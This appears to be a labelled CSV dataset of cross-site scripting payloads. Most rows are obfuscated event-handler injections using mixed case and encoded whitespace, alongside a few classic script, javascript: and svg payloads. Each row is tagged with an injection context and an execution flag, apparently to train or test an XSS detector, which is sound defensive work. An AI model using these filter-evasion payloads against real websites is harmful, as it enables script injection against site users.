payload,context,exec,combined
<HTML%0aOnpoiNterenTeR%0a=%0a(prompt)``%0dx//,html_text,0,CONTEXT_html_text <HTML%0aOnpoiNterenTeR%0a=%0a(prompt)``%0dx//
<dETailS%09OnPOiNTErENter+=+(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <dETailS%09OnPOiNTErENter+=+(confirm)()%0dx>
<HTml%0aonpOINterENteR%0a=%0aconfirm()//,html_tag,0,CONTEXT_html_tag <HTml%0aonpOINterENteR%0a=%0aconfirm()//
<A%0donmOUsEOveR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0donmOUsEOveR%0d=%0dconfirm()>v3dm0s
<d3v/+/OnMouSEOVeR%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/OnMouSEOVeR%0a=%0a(prompt)``>v3dm0s
<a%0dOnMoUsEOVER+=+(confirm)()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a%0dOnMoUsEOVER+=+(confirm)()%0dx>v3dm0s
"<Html%0dONMouSEOver%09=%09a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <Html%0dONMouSEOver%09=%09a=prompt,a()//"
<Html%09oNmOUSeovEr%0d=%0d[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <Html%09oNmOUSeovEr%0d=%0d[8].find(confirm)>
<script>alert(1)</script>,html_tag,1,CONTEXT_html_tag <script>alert(1)</script>
<HtmL%09onMOuSeoVeR+=+confirm()//,html_tag,0,CONTEXT_html_tag <HtmL%09onMOuSeoVeR+=+confirm()//
<DeTAILs%09ONTOggLe%0d=%0d(prompt)``%0dx//,html_text,0,CONTEXT_html_text <DeTAILs%09ONTOggLe%0d=%0d(prompt)``%0dx//
"<D3V%0aONmousEoveR%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3V%0aONmousEoveR%0a=%0aa=prompt,a()%0dx>v3dm0s"
<A%0dONmOUSeoveR%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONmOUSeoveR%09=%09confirm()%0dx>v3dm0s
<hTML%09oNMOuSeOVER+=+[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <hTML%09oNMOuSeOVER+=+[8].find(confirm)%0dx>
<d3v%0dOnPOINtErenTEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0dOnPOINtErenTEr%0d=%0dconfirm()>v3dm0s
<deTaIls%0dONTOgGle%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <deTaIls%0dONTOgGle%0a=%0aconfirm()//
<DetAilS%0aOnPOiNTerEnteR+=+[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <DetAilS%0aOnPOiNTerEnteR+=+[8].find(confirm)%0dx//
javascript:prompt(1),url_navigation,1,CONTEXT_url_navigation javascript:prompt(1)
<htMl%09onMouSEovER%09=%09confirm()%0dx//,html_text,0,CONTEXT_html_text <htMl%09onMouSEovER%09=%09confirm()%0dx//
<A%09onMOuSEoVeR+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <A%09onMOuSEoVeR+=+confirm()>v3dm0s
<a%0aOnmoUSeOVEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aOnmoUSeOVEr%0d=%0dconfirm()>v3dm0s
<d3V%09oNPOiNTEreNTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09oNPOiNTEreNTEr%09=%09confirm()%0dx>v3dm0s
<DEtaILS%0dONPoInTeRENTeR%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <DEtaILS%0dONPoInTeRENTeR%0a=%0aconfirm()//
"<d3V/+/OnpointeReNtER%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3V/+/OnpointeReNtER%0d=%0da=prompt,a()%0dx>v3dm0s"
<dETails%0aOnTOgGLe%09=%09[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <dETails%0aOnTOgGLe%09=%09[8].find(confirm)%0dx>
""" onblur=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onblur=alert(1) """
"<d3v/+/oNpoiNtEReNTer+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <d3v/+/oNpoiNtEReNTer+=+a=prompt,a()%0dx>v3dm0s"
<HTML/+/OnpOINTerenter%0d=%0d[8].find(confirm)//,html_text,0,CONTEXT_html_text <HTML/+/OnpOINTerenter%0d=%0d[8].find(confirm)//
<DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>,html_text,0,CONTEXT_html_text <DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>
<DETAIls%0donPOintErENteR%09=%09[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <DETAIls%0donPOintErENteR%09=%09[8].find(confirm)//
<d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09ONMoUseover%0d=%0d[8].find(confirm)>v3dm0s
"<detAILS%0dONToGgLe%0d=%0da=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <detAILS%0dONToGgLe%0d=%0da=prompt,a()%0dx>"
<dETailS%09OnPOiNTErENter+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <dETailS%09OnPOiNTErENter+=+(confirm)()%0dx>
"<DetaILS%0dontOGGLe%0a=%0aa=prompt,a()//",html_tag,0,"CONTEXT_html_tag <DetaILS%0dontOGGLe%0a=%0aa=prompt,a()//"
<HtMl%09oNPOIntEReNTER%0d=%0d[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <HtMl%09oNPOIntEReNTER%0d=%0d[8].find(confirm)>
<d3V%0aonpoiNTeRenTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aonpoiNTeRenTEr%09=%09confirm()%0dx>v3dm0s
<d3v/+/OnMouSEOVeR%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/OnMouSEOVeR%0a=%0a(prompt)``>v3dm0s
<D3v%09onMOUSEoVer+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <D3v%09onMOUSEoVer+=+confirm()>v3dm0s
<detAiLs%09oNTOgGLe+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <detAiLs%09oNTOgGLe+=+(confirm)()%0dx>
<hTML/+/ONPoiNTErENTer%0a=%0a[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <hTML/+/ONPoiNTErENTer%0a=%0a[8].find(confirm)%0dx>
&gt;,html_text,0,CONTEXT_html_text &gt;
<dETAIls/+/OnpOInTEReNTer%0d=%0dconfirm()>,html_tag,0,CONTEXT_html_tag <dETAIls/+/OnpOInTEReNTer%0d=%0dconfirm()>
<A%0dONmOuSEOveR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dONmOuSEOveR%09=%09(prompt)``%0dx>v3dm0s
<svg onload=,html_text,0,CONTEXT_html_text <svg onload=
<d3V%0doNMousEovER%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0doNMousEovER%09=%09confirm()>v3dm0s
<a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNpoINTEreNTeR%09=%09(prompt)``>v3dm0s
"<hTML%09ONMOUSEOVER+=+a=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <hTML%09ONMOUSEOVER+=+a=prompt,a()%0dx//"
<html%0dONmOuSeovER+=+[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <html%0dONmOuSeovER+=+[8].find(confirm)%0dx//
<dETailS%0dontoGglE+=+confirm()%0dx//,html_tag,0,CONTEXT_html_tag <dETailS%0dontoGglE+=+confirm()%0dx//
<d3V%0doNMoUSeOveR%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0doNMoUSeOveR%09=%09confirm()>v3dm0s
<d3V%0aONpoINtereNTeR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aONpoINtereNTeR%0d=%0d(prompt)``>v3dm0s
<d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/ONmoUSEOVeR%0a=%0a[8].find(confirm)>v3dm0s
<a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0dOnMoUSeOver%0d=%0d(confirm)()%0dx>v3dm0s
<A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s
<htmL%0dOnPoinTERenter+=+(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <htmL%0dOnPoinTERenter+=+(confirm)()%0dx//
<a%09onPoinTERenter%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09onPoinTERenter%0a=%0a(prompt)``>v3dm0s
<D3v%0aOnMOuSEOvER%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnMOuSEOvER%09=%09(prompt)``%0dx>v3dm0s
<A%0aOnpOiNTEREnTer%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aOnpOiNTEREnTer%0d=%0d(confirm)()%0dx>v3dm0s
<htmL%09onMouSEOVer%0a=%0a(confirm)()%0dx>,html_text,0,CONTEXT_html_text <htmL%09onMouSEOVer%0a=%0a(confirm)()%0dx>
<hTMl%0aONPOinTERentER%09=%09[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <hTMl%0aONPOinTERentER%09=%09[8].find(confirm)//
<dEtAiLs%0dONpOinTereNtER%0a=%0aconfirm()//,html_tag,0,CONTEXT_html_tag <dEtAiLs%0dONpOinTereNtER%0a=%0aconfirm()//
<d3V%0donPOINTEReNTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0donPOINTEReNTer%0d=%0dconfirm()%0dx>v3dm0s
<DetaiLs/+/oNtOggLE%0d=%0d[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <DetaiLs/+/oNtOggLE%0d=%0d[8].find(confirm)%0dx//
<d3V%0dONmoUSEOVER%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dONmoUSEOVER%09=%09(prompt)``>v3dm0s
<HtML/+/oNpOiNtereNteR+=+confirm()%0dx//,html_tag,0,CONTEXT_html_tag <HtML/+/oNpOiNtereNteR+=+confirm()%0dx//
<d3V/+/onMoUsEOVEr%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/onMoUsEOVEr%09=%09(confirm)()>v3dm0s
<A%09onMOusEOVeR%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09onMOusEOVeR%0d=%0d[8].find(confirm)>v3dm0s
%3Cspan%3E,html_text,0,CONTEXT_html_text %3Cspan%3E
<hTML%0donPOiNTeRENTeR%0d=%0dconfirm()%0dx>,html_text,0,CONTEXT_html_text <hTML%0donPOiNTeRENTeR%0d=%0dconfirm()%0dx>
<a%0dONMoUSeOver+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <a%0dONMoUSeOver+=+confirm()>v3dm0s
<D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s
<a%09OnPOinTErEnteR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnPOinTErEnteR%0a=%0a(prompt)``%0dx>v3dm0s
<D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s
<D3v%0doNmoUseOveR+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <D3v%0doNmoUseOveR+=+confirm()%0dx>v3dm0s
<A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/oNpoiNTereNTer%0d=%0d(prompt)``%0dx>v3dm0s
<DeTAILs/+/ONTOggLe%09=%09confirm()%0dx//,html_text,1,CONTEXT_html_text <DeTAILs/+/ONTOggLe%09=%09confirm()%0dx//
<A%0dONmOUseOvEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dONmOUseOvEr%0d=%0dconfirm()>v3dm0s
<dETAILs%09OnpOInteReNter%09=%09confirm()%0dx>,html_text,0,CONTEXT_html_text <dETAILs%09OnpOInteReNter%09=%09confirm()%0dx>
<DEtaIlS%0aontoggle+=+confirm()>,html_text,0,CONTEXT_html_text <DEtaIlS%0aontoggle+=+confirm()>
<D3v%0aOnPoinTerentER%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnPoinTerentER%09=%09(prompt)``%0dx>v3dm0s
<A/+/oNpoINTErEnTeR%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/oNpoINTErEnTeR%09=%09(prompt)``>v3dm0s
"<A%0aONPoINTeRENTeR%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%0aONPoINTeRENTeR%0d=%0da=prompt,a()>v3dm0s"
"<d3V%0aonPOiNtErENTeR+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <d3V%0aonPOiNtErENTeR+=+a=prompt,a()%0dx>v3dm0s"
<dEtAIlS%0aonTOgGLE%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <dEtAIlS%0aonTOgGLE%09=%09confirm()//
"<d3v%09oNpOinTeRENteR+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <d3v%09oNpOinTeRENteR+=+a=prompt,a()%0dx>v3dm0s"
<d3V%0dONpoiNteRENTeR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dONpoiNteRENTeR%09=%09(prompt)``%0dx>v3dm0s
<d3V%0doNMousEovER%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0doNMousEovER%09=%09confirm()>v3dm0s
<A%0aonmOuseoVer%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aonmOuseoVer%0d=%0d(confirm)()>v3dm0s
<d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s
"<d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s"
<deTAiLs%0donpOINTeReNteR%0a=%0aconfirm()%0dx>,html_text,0,CONTEXT_html_text <deTAiLs%0donpOINTeReNteR%0a=%0aconfirm()%0dx>
<HtML%0donmoUseoVER+=+(prompt)``//,html_tag,0,CONTEXT_html_tag <HtML%0donmoUseoVER+=+(prompt)``//
<detAIlS%0dONtoGGLe%0a=%0a(confirm)()//,html_tag,0,CONTEXT_html_tag <detAIlS%0dONtoGGLe%0a=%0a(confirm)()//
<dETAils/+/onPoInTeREnTEr%0a=%0a(confirm)()%0dx>,html_text,0,CONTEXT_html_text <dETAils/+/onPoInTeREnTEr%0a=%0a(confirm)()%0dx>
<detAIlS%09oNpointErEnTER+=+[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <detAIlS%09oNpointErEnTER+=+[8].find(confirm)%0dx>
</pre><svg/onload=alert`1`>,html_text,0,CONTEXT_html_text </pre><svg/onload=alert`1`>
<DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <DEtAilS/+/ONToGgLE%0d=%0d[8].find(confirm)%0dx>
<d3V%09ONmousEOVeR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09ONmousEOVeR%0d=%0dconfirm()>v3dm0s
<D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s
<d3V/+/onmousEoVeR+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <d3V/+/onmousEoVeR+=+confirm()%0dx>v3dm0s
<D3V%0aoNMouSEOVeR%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aoNMouSEOVeR%0a=%0aconfirm()>v3dm0s
<d3V%0donPOINTEReNTer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0donPOINTEReNTer%0d=%0dconfirm()%0dx>v3dm0s
<a/+/OnPOInTeRenTer%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnPOInTeRenTer%0d=%0d[8].find(confirm)>v3dm0s
<HtmL%0aoNpOiNTErENTEr%0d=%0d(confirm)()%0dx//,html_text,0,CONTEXT_html_text <HtmL%0aoNpOiNTErENTEr%0d=%0d(confirm)()%0dx//
<DeTaILS/+/oNPoInTerENteR%09=%09(confirm)()//,html_tag,0,CONTEXT_html_tag <DeTaILS/+/oNPoInTerENteR%09=%09(confirm)()//
<a/+/OnpoiNtErEntEr+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <a/+/OnpoiNtErEntEr+=+[8].find(confirm)>v3dm0s
<A%09OnmOUseoVer%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09OnmOUseoVer%09=%09(prompt)``%0dx>v3dm0s
<HTml%0aonmoUseOver%0d=%0dconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <HTml%0aonmoUseOver%0d=%0dconfirm()%0dx//
"<a%0aONPoiNTERenTEr%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%0aONPoiNTERenTEr%09=%09a=prompt,a()%0dx>v3dm0s"
<A/+/ONmOUseovEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONmOUseovEr%09=%09confirm()%0dx>v3dm0s
<HtMl%0doNMOuseoveR+=+[8].find(confirm)//,html_text,0,CONTEXT_html_text <HtMl%0doNMOuseoveR+=+[8].find(confirm)//
<htMl/+/onPoiNTEREntEr%09=%09(confirm)()//,html_tag,0,CONTEXT_html_tag <htMl/+/onPoiNTEREntEr%09=%09(confirm)()//
<hTml/+/oNPoInTerenTER%0a=%0aconfirm()>,html_tag,0,CONTEXT_html_tag <hTml/+/oNPoInTerenTER%0a=%0aconfirm()>
<DETaIls%09oNtogGLe+=+[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <DETaIls%09oNtogGLe+=+[8].find(confirm)//
<A%0aOnpOiNTEREnTer%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aOnpOiNTEREnTer%0d=%0d(confirm)()%0dx>v3dm0s
"<detAILS%0dONToGgLe%0d=%0da=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <detAILS%0dONToGgLe%0d=%0da=prompt,a()%0dx>"
<D3V/+/oNMoUsEOveR%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/oNMoUsEOveR%0d=%0d(prompt)``>v3dm0s
<a%09oNMouseOveR%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09oNMouseOveR%0a=%0a(confirm)()%0dx>v3dm0s
<d3v/+/onMOUseovEr+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <d3v/+/onMOUseovEr+=+confirm()>v3dm0s
"<a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <a%0doNpoINTereNtER+=+a=prompt,a()>v3dm0s"
<D3V%0aonmOuSEOVEr%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aonmOuSEOVEr%0a=%0aconfirm()>v3dm0s
<D3V%09OnpOintERenTER%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09OnpOintERenTER%09=%09(prompt)``%0dx>v3dm0s
<d3v%09ONmOuseoveR%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09ONmOuseoveR%0d=%0dconfirm()%0dx>v3dm0s
<A%0aoNmouseoVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNmouseoVeR%0a=%0a(prompt)``%0dx>v3dm0s
<deTAilS%09oNpOinteReNTeR%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <deTAilS%09oNpOinteReNTeR%09=%09confirm()>
<html%09oNPOintErENtER%0d=%0d(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <html%09oNPOintErENtER%0d=%0d(confirm)()%0dx>
<A%0aonPOinteREnTeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aonPOinteREnTeR%09=%09[8].find(confirm)%0dx>v3dm0s
"<dEtAiLS%0dOnPoiNTerentER+=+a=prompt,a()//",html_text,0,"CONTEXT_html_text <dEtAiLS%0dOnPoiNTerentER+=+a=prompt,a()//"
"<d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s"
<DEtaILs%0dONToGGlE%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <DEtaILs%0dONToGGlE%09=%09confirm()%0dx//
"<htML%09oNpOINteREnter%09=%09a=prompt,a()//",html_text,0,"CONTEXT_html_text <htML%09oNpOINteREnter%09=%09a=prompt,a()//"
<DETailS%0aoNTogGlE+=+(confirm)()%0dx//,html_text,0,CONTEXT_html_text <DETailS%0aoNTogGlE+=+(confirm)()%0dx//
"<HtmL%0donpoiNTErEntER%0a=%0aa=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <HtmL%0donpoiNTErEntER%0a=%0aa=prompt,a()%0dx//"
"<hTML/+/oNMouSEoVER%0a=%0aa=prompt,a()>",html_tag,0,"CONTEXT_html_tag <hTML/+/oNMouSEoVER%0a=%0aa=prompt,a()>"
<A%09onmOuSeovEr+=+(confirm)()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%09onmOuSeovEr+=+(confirm)()%0dx>v3dm0s
<HTml%0dOnpoINTERENTEr%09=%09confirm()%0dx//,html_text,0,CONTEXT_html_text <HTml%0dOnpoINTERENTEr%09=%09confirm()%0dx//
<HtMl%09ONmouseOVEr%0a=%0a(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <HtMl%09ONmouseOVEr%0a=%0a(confirm)()%0dx//
<A/+/onpOiNTEReNtER%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/onpOiNTEReNtER%0a=%0a(confirm)()>v3dm0s
<HTmL%09oNmouSEOveR%09=%09confirm()>,html_text,0,CONTEXT_html_text <HTmL%09oNmouSEOveR%09=%09confirm()>
<d3V/+/onMOUSeoVEr%0a=%0a[8].find(confirm)>v3dm0s,html_attribute,0,CONTEXT_html_attribute <d3V/+/onMOUSeoVEr%0a=%0a[8].find(confirm)>v3dm0s
<a%0donmousEOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a%0donmousEOvEr%0d=%0d[8].find(confirm)>v3dm0s
<d3v%0aoNMOuSeoVEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aoNMOuSeoVEr%0a=%0aconfirm()%0dx>v3dm0s
<DeTAilS%09OnPoInTEREnTer%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <DeTAilS%09OnPoInTEREnTer%0a=%0aconfirm()%0dx//
<dETaIls%09ONpoiNtEreNteR%0a=%0a[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <dETaIls%09ONpoiNtEreNteR%0a=%0a[8].find(confirm)%0dx//
"<DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <DetAILS%09oNtOgglE%09=%09a=prompt,a()%0dx>"
<A%0doNpOINTEReNter%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0doNpOINTEReNter%0a=%0a[8].find(confirm)%0dx>v3dm0s
<DetaIls%0aONtoggLE%0d=%0dconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <DetaIls%0aONtoggLE%0d=%0dconfirm()%0dx//
<a%0donmousEOvEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0donmousEOvEr%0d=%0d[8].find(confirm)>v3dm0s
<A%0aonMOUseoVER%0d=%0d(confirm)()%0dx>v3dm0s,url_navigation,0,CONTEXT_url_navigation <A%0aonMOUseoVER%0d=%0d(confirm)()%0dx>v3dm0s
<A%0aONPOIntErENTEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aONPOIntErENTEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<a%09onPOinterENTer%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09onPOinterENTer%0d=%0d(confirm)()>v3dm0s
<A%0donmOUsEOveR%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0donmOUsEOveR%0d=%0dconfirm()>v3dm0s
<D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09onPOintereNtER%0d=%0dconfirm()%0dx>v3dm0s
<D3V%0aonmOuSEOVEr%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aonmOuSEOVEr%0a=%0aconfirm()>v3dm0s
<d3v%09ONmOuseoveR%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09ONmOuseoveR%0d=%0dconfirm()%0dx>v3dm0s
<A/+/oNmOUsEoveR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNmOUsEoveR%0a=%0a[8].find(confirm)>v3dm0s
<detAIlS/+/OntoGGle%09=%09(prompt)``//,html_text,0,CONTEXT_html_text <detAIlS/+/OntoGGle%09=%09(prompt)``//
"<hTML%09ONMOUSEOVER+=+a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <hTML%09ONMOUSEOVER+=+a=prompt,a()%0dx//"
<a%09ONPointERentER%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09ONPointERentER%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<HTml%0aONPoInterEnteR%0d=%0da=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <HTml%0aONPoInterEnteR%0d=%0da=prompt,a()%0dx//"
<a%0dOnpOINTerEnTeR%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <a%0dOnpOINTerEnTeR%0a=%0a(prompt)``>v3dm0s
""";confirm(1);//",script_block,1,"CONTEXT_script_block "";confirm(1);//"
<d3V/+/onMoUsEOVEr%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/onMoUsEOVEr%09=%09(confirm)()>v3dm0s
